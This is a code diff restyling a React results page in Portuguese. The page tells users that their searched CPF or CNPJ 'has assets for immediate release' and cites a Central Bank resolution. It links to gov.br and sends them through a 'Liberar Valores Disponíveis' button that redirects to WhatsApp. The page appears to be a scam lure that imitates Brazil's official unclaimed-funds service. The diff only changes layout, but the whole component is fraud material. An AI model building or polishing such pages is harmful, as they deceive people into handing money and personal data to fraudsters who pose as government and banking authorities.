@@ -170,94 +170,95 @@ export function Step2({ data, onReset }: Step2Props) {
           animate={{ opacity: 1, y: 0 }}
           className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] w-full max-w-[880px] mx-auto shadow-md transition-colors duration-300"
         >
-          <div className="p-6 md:p-14 flex flex-col md:flex-row gap-8 md:gap-16 items-center md:items-start">
-            
-            {/* Checkmark Section - Top on Mobile, Left on Desktop */}
-            <div className="flex-shrink-0 flex justify-center md:pt-4">
-              <div className="w-20 h-20 md:w-40 md:h-40">
-                <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
-                  <path 
-                    fill="none" 
-                    stroke="currentColor" 
-                    strokeWidth="4" 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    d="M14 27l8 8 16-16" 
-                    className="drop-shadow-sm"
-                  />
-                </svg>
-              </div>
-            </div>
-
-            {/* Content Section */}
-            <div className="flex-grow space-y-6 text-center md:text-left">
+            {/* Layout Container */}
+            <div className="p-8 md:p-16 flex flex-col md:flex-row gap-10 md:gap-16">
               
-              {/* Title and Identification */}
-              <div className="space-y-3">
-                <h2 className="text-[22px] md:text-[32px] font-bold text-[#455a64] dark:text-white leading-tight tracking-tight">
-                  O {data.docType} pesquisado possui ativos para liberação imediata
-                </h2>
-                <div className="text-[14px] md:text-[15px] text-[#666] dark:text-gray-400 flex flex-col items-center md:items-start font-medium">
-                   <p className="flex gap-2"><span>{data.docType}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.docValue}</span></p>
-                   <p className="flex gap-2"><span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.birthDate}</span></p>
+              {/* Left Column: Checkmark (Centered on Mobile, End-aligned on Desktop) */}
+              <div className="w-full md:w-[25%] flex justify-center md:justify-end">
+                <div className="w-24 h-24 md:w-44 md:h-44">
+                  <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
+                    <path 
+                      fill="none" 
+                      stroke="currentColor" 
+                      strokeWidth="3.5" 
+                      strokeLinecap="round" 
+                      strokeLinejoin="round" 
+                      d="M14 27l8 8 16-16" 
+                      className="drop-shadow-sm"
+                    />
+                  </svg>
                 </div>
               </div>
 
-              {/* Resolution Box */}
-              <div className="w-full bg-[#f1f3f4] dark:bg-[#2c3e50] p-4 md:p-5 border border-[#e0e0e0] dark:border-[#3b4a5a] rounded-[2px]">
-                <p className="text-[15px] md:text-[16px] font-bold text-[#444] dark:text-gray-100">
-                  O procedimento de resgate está sujeito à validação de segurança conforme a Resolução BCB nº 4.862/2020.
-                </p>
-              </div>
-
-              {/* Juridical Descriptions */}
-              <div className="space-y-4 text-[15px] md:text-[17px] text-[#444] dark:text-gray-300 leading-relaxed font-normal">
-                <p>
-                  Para garantir a integridade da transferência fiscal, o sistema exige a conclusão das etapas obrigatórias de homologação documental e vínculo bancário do titular.
-                </p>
-                <p>
-                  A liberação dos ativos será processada de forma sigilosa e segura após a autenticação em tempo real realizada através de nossos canais oficiais.
-                </p>
-              </div>
-
-              {/* Action Buttons Row */}
-              <div className="pt-6 flex flex-col gap-4">
-                <div className="flex flex-col md:flex-row md:justify-end gap-3 w-full">
-                  <button
-                    onClick={handleWhatsAppRedirect}
-                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-8 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm uppercase order-1 md:order-none w-full md:w-auto min-w-[260px]"
-                  >
-                    <ArrowRight size={18} className="-rotate-45" /> Liberar Valores Disponíveis
-                  </button>
-                  <button
-                    onClick={onReset}
-                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] md:text-[15px] shadow-sm order-2 md:order-none w-full md:w-auto"
-                  >
-                    <Search size={18} /> Nova consulta
-                  </button>
-                  <button
-                    onClick={() => window.location.reload()}
-                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] md:text-[15px] shadow-sm order-3 md:order-none w-full md:w-auto"
-                  >
-                    <X size={18} /> Sair
-                  </button>
+              {/* Right Column: Content (Centered on Mobile, Start-aligned on Desktop) */}
+              <div className="w-full md:w-[75%] space-y-8 text-center md:text-left">
+                
+                {/* Title and Identification */}
+                <div className="space-y-4">
+                  <h2 className="text-[24px] md:text-[36px] font-bold text-[#455a64] dark:text-white leading-tight tracking-tight">
+                    O {data.docType} pesquisado possui ativos para liberação imediata
+                  </h2>
+                  <div className="text-[15px] md:text-[17px] text-[#666] dark:text-gray-400 flex flex-col items-center md:items-start font-medium space-y-1">
+                     <p className="flex gap-2"><span>{data.docType}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.docValue}</span></p>
+                     <p className="flex gap-2"><span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.birthDate}</span></p>
+                  </div>
                 </div>
-              </div>
 
-              {/* Footer Gov.br Link */}
-              <div className="pt-10 border-t border-gray-100 dark:border-gray-800 text-center w-full">
-                <a 
-                  href="https://acesso.gov.br" 
-                  target="_blank" 
-                  rel="noopener noreferrer"
-                  className="text-[12px] md:text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-bold"
-                >
-                  *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
-                </a>
-              </div>
+                {/* Resolution Box */}
+                <div className="w-full bg-[#f1f3f4] dark:bg-[#2c3e50] p-5 md:p-6 border border-[#e0e0e0] dark:border-[#3b4a5a] rounded-sm shadow-inner">
+                  <p className="text-[16px] md:text-[18px] font-bold text-[#444] dark:text-gray-100">
+                    O procedimento de resgate está sujeito à validação de segurança conforme a Resolução BCB nº 4.862/2020.
+                  </p>
+                </div>
 
+                {/* Juridical Descriptions */}
+                <div className="space-y-5 text-[16px] md:text-[18px] text-[#444] dark:text-gray-300 leading-relaxed font-normal">
+                  <p>
+                    Para garantir a integridade da transferência fiscal, o sistema exige a conclusão das etapas obrigatórias de homologação documental e vínculo bancário do titular.
+                  </p>
+                  <p>
+                    A liberação dos ativos será processada de forma sigilosa e segura após a autenticação em tempo real realizada através de nossos canais oficiais.
+                  </p>
+                </div>
+
+                {/* Action Buttons Row */}
+                <div className="pt-6 flex flex-col gap-5">
+                  <div className="flex flex-col md:flex-row md:justify-end gap-4 w-full">
+                    <button
+                      onClick={handleWhatsAppRedirect}
+                      className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3.5 px-8 rounded-sm flex items-center justify-center gap-2 transition-all text-[16px] md:text-[18px] shadow-md uppercase order-1 md:order-none w-full md:w-auto min-w-[280px]"
+                    >
+                      <ArrowRight size={20} className="-rotate-45" /> Liberar Valores Disponíveis
+                    </button>
+                    <button
+                      onClick={onReset}
+                      className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm order-2 md:order-none w-full md:w-auto"
+                    >
+                      <Search size={20} /> Nova consulta
+                    </button>
+                    <button
+                      onClick={() => window.location.reload()}
+                      className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm order-3 md:order-none w-full md:w-auto"
+                    >
+                      <X size={20} /> Sair
+                    </button>
+                  </div>
+                </div>
+
+                {/* Footer Gov.br Link */}
+                <div className="pt-10 border-t border-gray-100 dark:border-gray-800 text-center w-full">
+                  <a 
+                    href="https://acesso.gov.br" 
+                    target="_blank" 
+                    rel="noopener noreferrer"
+                    className="text-[13px] md:text-[14px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-bold"
+                  >
+                    *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
+                  </a>
+                </div>
+
+              </div>
             </div>
-          </div>
         </motion.div>
       )}
 
